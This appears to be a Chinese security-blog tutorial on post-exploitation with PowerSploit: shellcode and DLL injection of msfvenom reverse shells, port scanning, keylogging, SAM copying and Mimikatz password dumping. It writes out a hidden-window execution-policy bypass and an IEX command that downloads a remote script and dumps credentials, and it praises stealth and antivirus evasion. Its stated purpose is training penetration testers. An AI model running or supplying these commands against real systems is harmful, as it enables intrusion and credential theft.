# 内网渗透利器之PowerSploit

## **0x00 过渡**

之前提到当在执行powershell脚本时，由于默认策略的缘故，是会报错的，因此也出现了几种逃过的情况：

本地权限绕过：PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1，此外还可以通过本地隐藏权限进行绕过：PowerShell.exe -ExecutionPolicy Bypass -NoLogo –NonInteractive -NoProfile -WindowStyle Hidden -File xxx.ps1

IEX下载远程PS1脚本权限绕过执行（在本例PowerSploit框架利用中会使用）：powershell.exe "IEX \(New-Object Net.WebClient\).DownloadString\('http://网址/对应脚本名称'\); Invoke-Mimikatz -DumpCreds"

## **0x01 PowerSploit简介**

PowerSploit是Microsoft PowerShell模块的集合，可用于在评估的所有阶段帮助渗透测试人员。PowerSploit由以下模块和脚本组成：

![11.jpg](https://image.3001.net/images/20180516/15264544315034.jpg!small)

本次将会展示CodeExecution模块、Recon模块、Exfiltration模块以及Privesc模块的部分主流的脚本的渗透实例。

## **0x02 利用PowerSploit框架进行渗透的一些实例**

### **0x00 准备工作**

a\) 在kali（因为kali上集成很多好用的工具以及环境）上使用命令`git clone` [`https://github.com/mattifestation/PowerSploit.git`](https://github.com/mattifestation/PowerSploit.git) 下载最新版的PowerSploit脚本文件；或者直接进入https：//github.com/PowerShellMafia/PowerSploit 下载脚本文件。

b\) 打开一个web服务，并将下载的脚本文件放入web中，供我们通过IEX调用。

c\) 打开kali中的metasploit，本次的测试有部分需要通过metasploit结合完成。

### **0x01 CodeExecution模块**

#### **a\) 调用Invoke-Shellcode将shellcode注入到本地的Powershell。**

1）打开一个web服务，并将PowerSploit脚本添加到web中，以便后续实验中可通过IEX进行下载调用（此处我在kali中开启apache2服务）。

![&#x670D;&#x52A1; 1.png](https://image.3001.net/images/20180516/15264546436086.png!small)

![&#x670D;&#x52A1; 2.png](https://image.3001.net/images/20180516/15264546589330.png!small)

2）利用msfvenom生成一个反弹木马，以供invoke-shellcode注入，同样生成的反弹马放入web中。

![web.png](https://image.3001.net/images/20180516/15264546923696.png!small)

3）这里为了更好的展现效果，因此直接在powershell中进行操作，通过IEX下载调用invoke-shellcode以及生成的反弹马。

![fantan.png](https://image.3001.net/images/20180516/15264547188192.png!small)

4）在kali中打开metasploit并设置好监听（只需设置PAYLOAD、LHOST、LPORT）。

![jianting  1.png](https://image.3001.net/images/20180516/15264547541467.png!small)

![jianting  2.png](https://image.3001.net/images/20180516/15264547718571.png!small)

5）在powershell中调用invoke-shellcode（可通过help命令来查询具体操作以及例子）。

![&#x4F8B;&#x5B50;.png](https://image.3001.net/images/20180516/15264548062575.png!small)

注意：若此处关闭powershell，那么连接也将终断，因为承载木马的powershell被关闭了。

#### **b\) 调用invoke-shellcode将shellcode注入到指定的进程中。**

1）前面步骤和a的步骤一致，唯一不同的就是在最后的命令上，首先，查看我们需要注入的进程，建议可注入到系统的进程，因为一旦进程关闭，那么监听也将终断，因此系统进程一般不会被关闭，注意：不能注入到像360等驱动中，不然会被强制关闭。

![&#x5173;&#x95ED; 1.png](https://image.3001.net/images/20180516/15264549189704.png!small)

![&#x5173;&#x95ED; 2.png](https://image.3001.net/images/20180516/1526454939363.png!small)

注意：和a类似的，若关闭notepad进程，则连接中断。

#### **c\) 调用invoke-dllinjection将DLL注入到进程中。**

1）通过msfvenom生成DLL的反弹木马，并下载到目标主机中（为了方便，直接将dll文件下载至powershell运行的桌面），在实际环境中，也可以通过该方法进行传输dll文件。

![&#x6587;&#x4EF6; 1.png](https://image.3001.net/images/20180516/15264550508536.png!small)

![&#x6587;&#x4EF6; 2.png](https://image.3001.net/images/20180516/15264550682077.png!small)

2）设置好监听。

![&#x76D1;&#x542C;  1.png](https://image.3001.net/images/20180516/15264551363820.png!small)

![&#x76D1;&#x542C;  2.png](https://image.3001.net/images/20180516/15264551557846.png!small)

3）通过IEX调用下载并调用invoke-dllinjection，将DLL文件直接注入到notepad进程中。

![&#x8FDB;&#x7A0B;  1.png](https://image.3001.net/images/20180516/15264553347193.png!small)

![&#x8FDB;&#x7A0B; 2.png](https://image.3001.net/images/20180516/15264558717719.png!small)

![&#x8FDB;&#x7A0B; 3.png](https://image.3001.net/images/20180516/15264558888009.png!small)

### **0x02 Recon模块**

#### a\) 调用invoke-Portscan扫描内网主机的端口。

1）通过IEX下载并调用invoke-portscan。

![x  1.png](https://image.3001.net/images/20180516/15264560675426.png!small)

![x  2.png](https://image.3001.net/images/20180516/15264561015771.png!small)![x  3.png](https://image.3001.net/images/20180516/15264561148792.png!small)

注意：这里用的全端口扫描，不建议这么做，耗费时间太长，可以扫描一些常规端口。

#### **b\) 调用Get-HttpStatus扫描目标站点的目录。**

1）通过IEX下载并调用Get-HttpStatus。

![s  1.png](https://image.3001.net/images/20180516/15264566742305.png!small)

![s  2.png](https://image.3001.net/images/20180516/15264566911137.png!small)![s  3.png](https://image.3001.net/images/20180516/15264567062842.png!small)![s  4.png](https://image.3001.net/images/20180516/1526456719548.png!small)

#### **c\) 调用Invoke-ReverseDnsLookup扫描内网主机的ip对应的主机名。**

1）通过IEX下载并调用Invoke-ReverseDnsLookup。

![up   1.png](https://image.3001.net/images/20180516/15264568918002.png!small)

![up   2.png](https://image.3001.net/images/20180516/15264569104083.png!small)

### **0x03 Exfiltration模块**

**a\) 调用Get-Keystrokes记录用户的键盘输入。**

1）通过IEX下载并调用Get-Keystrokes。

![s  1.png](https://image.3001.net/images/20180516/1526457035225.png!small)

![s  2.png](https://image.3001.net/images/20180516/15264570651007.png!small)

**b\) 调用Invoke-NinjaCopy复制一些系统无法复制的文件如sam文件。**

1）通过IEX下载并调用Get-NinjaCopy。

正常情况下复制：

![fuzhi  1.png](https://image.3001.net/images/20180516/15264572186562.png!small)

通过Invoke-NinjaCopy进行复制：

![fuzhi  2.png](https://image.3001.net/images/20180516/15264572401322.png!small)

注意：这个脚本是要有管理员权限下才可以正常执行，否则会报错，毕竟是要拷贝系统文件，只是它做了管理员做不了的事。

**c\) 调用Invoke-Mimikatz（内网神器）抓取内存中的明文密码。**

1）通过IEX下载并调用Invoke-Mimikatz。

![tz  1.png](https://image.3001.net/images/20180516/15264574123108.png!small)

![tz  2.png](https://image.3001.net/images/20180516/15264574396962.png!small)

注意：这个脚本是要有管理员权限下才可以正常执行，否则会报错，毕竟涉及到密码之类的敏感信息，哪怕是管理员想看到明文的，也是很难实现的。

**0x03 小结**

 PowerSploit也许有些模块有些脚本看似用处很小，但是我认为其实不然，可能是我们的经验阅历不高，并未遇到一个适合的环境或者时机。不过总体感觉PowerShell内网渗透还是很强大的，它不仅可以免杀执行，还可以毫无痕迹地在电脑中进行操作。

 对于PowerShell内网渗透就这些了，也许不够多，但是小编想将一句话送给大家，是一个大神讲过的----“工具就像武器，要多用多练；要在实践中灵活利用，不能死板照搬”，想学好一个工具，多进行运用远比停留在理论学习来得强。最后希望大家能够在PowerShell内网渗透中获取更多的“宝藏”。

